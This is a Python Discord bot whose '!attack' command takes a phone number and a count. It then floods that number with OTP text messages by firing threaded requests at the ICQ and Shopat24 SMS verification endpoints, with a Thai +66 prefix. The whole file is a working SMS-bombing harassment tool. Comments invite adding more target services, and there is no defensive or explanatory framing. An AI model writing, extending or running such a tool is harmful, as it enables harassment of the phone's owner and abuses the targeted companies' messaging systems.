import discord
from discord.ext import commands
import re
import requests
import threading

intents = discord.Intents.default()

intents.message_content = True

client = discord.Client(intents=intents)

bot = commands.Bot(command_prefix='!')

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@bot.command()
async def attack(ctx, number: str, z: int):
    phone = "0" + number

    def icq():
        requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode", json={"reqId": "39816-1633012470", "params": {"phone": "+66" + phone, "language": "en-US", "route": "sms", "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}})
        print("--Icq _ Attack--")

    def shop24():
        requests.post("https://www.shopat24.com/register/ajax/requestotp", data={"phone": "0" + phone}, headers={})
        print("--Shopat24 _ Attack--")

    # Define other attack functions similarly

    for i in range(z):
        threading.Thread(target=icq).start()
        threading.Thread(target=shop24).start()
        # Start other attack threads here

    await ctx.send("Attacks started!")

bot.run('YOUR_DISCORD_TOKEN')
